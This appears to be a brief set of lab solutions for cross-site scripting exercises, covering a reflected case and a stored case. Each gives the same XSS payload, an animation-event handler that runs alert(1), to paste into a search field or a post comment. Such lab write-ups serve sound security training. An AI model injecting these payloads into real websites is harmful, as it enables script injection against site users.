# Cross-site Scripting

## Reflected XSS into HTML context with nothing encoded

In the search field paste this:

```
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
```

## Lab: Stored XSS into HTML context with nothing encoded

In the comments of a post:

```
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
```
